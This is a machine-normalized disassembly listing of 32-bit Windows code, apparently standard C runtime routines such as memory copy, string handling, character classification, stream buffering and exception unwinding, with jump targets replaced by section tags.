shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_409a84 ]
jmp [ ecx * 4 + jump_table_409b04 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_409b70 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_409d0c ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_409c10 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_409d0c ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_409b70 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_409d0c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_409b70 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_409b70 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_409b70 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_409d0c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_409d0c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_409d0c ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_409d61
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_404172
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_40989a
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_409db2
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_409d61
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x4
pop ebp
retn
sub_409de0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_404172
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x80
lea eax [ ebp - 0x10 ]
push eax
push 0x80
push [ ebp + 0x8 ]
call sub_40989a
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_409e36
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_409de0
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x80
pop ebp
retn
sub_409e66
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_404172
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8
lea eax [ ebp - 0x10 ]
push eax
push 0x8
push [ ebp + 0x8 ]
call sub_40989a
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_409eb7
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_409e66
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8
pop ebp
retn
sub_409ee5
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
call sub_405072
mov [ eax ] 0x16
call sub_405020
jmp r-xdata
or eax 0xffffffff
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or eax 0x1
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_408912
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
and [ esi + 0x4 ] 0x0
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push esi
call sub_408b66
pop ecx
push eax
call sub_40bc2a
add esp 0xc
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
test [ esi + 0xc ] 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
push esi
call sub_408b66
pop ecx
cmp eax 0xffffffff
je r-xdata
mov ecx [ esi ]
dec [ esi + 0x4 ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
mov eax [ esi + 0xc ]
test al 0x8
je r-xdata
mov eax rw-data
push esi
call sub_408b66
pop ecx
cmp eax 0xfffffffe
je r-xdata
pop esi
pop ebp
retn
test eax 0x400
jne r-xdata
or [ esi + 0xc ] 0x2000
push edi
push esi
call sub_408b66
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_408b66
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
pop edi
jmp r-xdata
mov [ esi + 0x18 ] 0x1000
mov al [ eax + 0x4 ]
and al 0x82
cmp al 0x82
jne r-xdata
sub_40a007
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
or edi 0xffffffff
test [ esi + 0xc ] 0x40
jne r-xdata
mov ebx [ ebp + 0x8 ]
cmp ebx edi
je r-xdata
push esi
call sub_408b66
pop ecx
mov edx rw-data
cmp eax edi
je r-xdata
mov eax edi
mov eax [ esi + 0xc ]
test al 0x1
jne r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
test al al
jns r-xdata
call sub_405072
mov [ eax ] 0x16
call sub_405020
cmp eax edi
je r-xdata
mov ecx eax
and ecx 0x1f
mov ebx eax
sar ebx 0x5
shl ecx 0x6
add ecx [ ebx * 4 + rw-data ]
jmp r-xdata
mov eax [ esi ]
cmp eax [ esi + 0x8 ]
jne r-xdata
push esi
call sub_408912
pop ecx
test al 0x2
jne r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
dec [ esi ]
test [ esi + 0xc ] 0x40
mov eax [ esi ]
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov [ eax ] bl
cmp [ eax ] bl
je r-xdata
inc eax
mov [ esi ] eax
test [ eax + 0x24 ] 0x80
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi + 0xc ]
inc [ esi + 0x4 ]
and eax 0xffffffef
or eax 0x1
mov [ esi + 0xc ] eax
mov eax ebx
and eax 0xff
jmp r-xdata
inc eax
mov [ esi ] eax
jmp r-xdata
sub_40a0ea
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ esi ] bl
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_404172
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_409731
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push 0x1
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xac ]
cmp ecx 0x1
jle r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx ecx [ esi ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0xac ]
jb r-xdata
cmp [ ebp + 0x10 ] ecx
jl r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_405072
mov [ eax ] 0x2a
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ esi + 0x1 ] bl
je r-xdata
xor edx edx
cmp [ ebp + 0x8 ] ebx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ ebp - 0x10 ]
jne r-xdata
pop esi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ eax + 0xac ]
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_40a21a
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
push esi
push edi
mov [ ebp - 0x1c ] eax
call sub_406596
and [ ebp - 0x14 ] 0x0
cmp [ rw-data ] 0x0
mov [ ebp - 0x18 ] eax
jne r-xdata
mov eax [ rw-data ]
mov ecx [ ebp - 0x18 ]
mov esi [ DecodePointer@IAT ]
cmp eax ecx
je r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
cmp [ rw-data ] ecx
je r-xdata
xor eax eax
mov edi [ GetProcAddress@IAT ]
push r--data
push ebx
call edi
test eax eax
je r-xdata
push [ rw-data ]
call esi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
push eax
call esi
push [ rw-data ]
mov edi eax
call esi
mov ebx eax
test edi edi
je r-xdata
mov esi [ EncodePointer@IAT ]
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
mov [ rw-data ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push [ ebp - 0x14 ]
call eax
jmp r-xdata
call eax
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
test ebx ebx
je r-xdata
push r--data
push ebx
call edi
push eax
call esi
mov [ rw-data ] eax
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4030d9
leave
retn
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
call edi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x24 ]
push ecx
push 0xc
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
push eax
call ebx
test eax eax
je r-xdata
push [ ebp - 0x14 ]
call eax
mov [ ebp - 0x14 ] eax
test [ ebp - 0x8 ] 0x1
jne r-xdata
sub_40a386
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_405072
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
mov edx esi
xor eax eax
mov [ esi ] ax
jmp r-xdata
test edi edi
je r-xdata
add edx 0x2
dec edi
jne r-xdata
sub edx ecx
cmp [ edx ] 0x0
je r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_405072
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx eax [ ecx ]
mov [ edx + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
call sub_405020
mov eax esi
sub_40a3fb
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
push edi
test ebx ebx
jne r-xdata
test edx edx
je r-xdata
test edx edx
jne r-xdata
call sub_405072
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test ebx ebx
jne r-xdata
xor eax eax
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov eax edx
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov esi ecx
sub esi edx
mov esi edx
sub esi ecx
test ebx ebx
jne r-xdata
dec edi
je r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor ecx ecx
mov [ eax ] cx
dec ebx
jne r-xdata
xor eax eax
cmp ebx 0xffffffff
jne r-xdata
movzx eax [ ecx ]
mov [ esi + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
jmp r-xdata
movzx ecx [ esi + eax ]
mov [ eax ] cx
add eax 0x2
test cx cx
je r-xdata
mov [ edx ] ax
call sub_405072
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x50
mov [ edx + ecx * 2 - 0x2 ] ax
pop eax
jmp r-xdata
call sub_405020
mov eax esi
jmp r-xdata
sub_40a4c8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax [ ebp + 0x8 ]
sar eax 0x1
dec eax
pop ebp
retn
sub_40a4e3
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
test esi esi
je r-xdata
call sub_405072
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov edx esi
sub edx eax
mov [ esi ] ax
jmp r-xdata
xor eax eax
test edi edi
jne r-xdata
dec edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov [ esi ] ax
call sub_405072
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx ecx [ eax ]
mov [ edx + eax ] cx
add eax 0x2
test cx cx
je r-xdata
call sub_405020
mov eax esi
sub_40a546
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
js r-xdata
call sub_405072
mov [ eax ] 0x16
call sub_405020
or eax 0xffffffff
pop ebp
retn
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
pop ebp
retn
cmp ecx 0x3
jne r-xdata
mov eax [ rw-data ]
pop ebp
retn
sub_40a585
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_404172
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_40a5f0
call sub_407b3f
test eax eax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_407b4c
pop ecx
push 0x3
call sub_403cf5
int3
push 0x1
push 0x40000015
push 0x3
call sub_404ea5
add esp 0xc
sub_40a623
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_405311
pop ecx
sub_40a650
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a670
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_4030d9
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_40a6b5
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_40a6b5
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_40a670
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_40a765
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_40a784
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_40a765
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_40a787
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp ecx ebx
jl r-xdata
call sub_405072
mov [ eax ] 0x9
call sub_405085
mov [ eax ] ebx
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov eax ecx
sar eax 0x5
mov esi ecx
and esi 0x1f
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
shl esi 0x6
test [ eax + esi + 0x4 ] 0x1
je r-xdata
cmp [ eax + esi ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
sub ecx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_40a80d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_405085
and [ eax ] 0x0
call sub_405072
mov [ eax ] 0x9
call sub_405085
and [ eax ] 0x0
call sub_405072
mov [ eax ] 0x9
call sub_405020
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
or eax 0xffffffff
pop ebp
retn
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
test [ eax + ecx + 0x4 ] 0x1
je r-xdata
mov eax [ eax + ecx ]
pop ebp
retn
sub_40a876
push 0xc
push r--data
call sub_403d50
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x1c ] 0x1
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0xa
call sub_407a6d
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_403d95
retn
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40a90c
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
inc [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
sub_40a915
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_40a93c
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0xfffffffe
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
call sub_40bd4c
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
je r-xdata
mov eax 0xffff
leave
retn
mov ax [ ebp + 0x8 ]
leave
retn
sub_40a980
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_40a9ab
push 0x10
push r--data
call sub_403d50
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x1
call sub_407a6d
pop ecx
mov [ ebp - 0x4 ] ebx
push 0x3
pop edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40aa3e
